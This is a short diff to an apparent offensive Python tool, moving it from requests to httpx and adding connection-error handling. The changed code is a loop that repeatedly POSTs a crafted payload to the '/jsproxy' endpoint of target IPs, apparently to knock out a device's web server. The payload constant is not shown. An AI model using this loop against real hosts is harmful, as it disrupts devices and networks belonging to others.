@@ -9,11 +9,10 @@
 
 from typing import Annotated
 
-import requests
+import httpx
 import rich
 import typer
 from prompt_toolkit.shortcuts import yes_no_dialog
-from requests.exceptions import ConnectionError
 
 from mkx.core.colors import BOLD, GREEN, RESET, YELLOW
 from mkx.core.helps import KILL_WEB_SERVER_HELP
@@ -86,17 +85,26 @@ def main(
         '+[bold red]C[/bold red] to stop'
     )
 
+    error = False
     while True:
+        if error:
+            break
         try:
             for ip in target:
                 try:
-                    requests.post(
+                    httpx.post(
                         f'{http}://{ip}/jsproxy',
                         headers={'Content-Type': 'msg'},
                         data=DATA,
                     )
-                except ConnectionError:
-                    pass
+                except httpx.ConnectError:
+                    rich.print(
+                        '[bold red][[/bold red]'
+                        '[bold yellow]*[/bold yellow]'
+                        '[bold red]][/bold red]'
+                        f' Unable to connect to host {ip}'
+                    )
+                    error = True
         except KeyboardInterrupt:
             break
     typer.Exit()
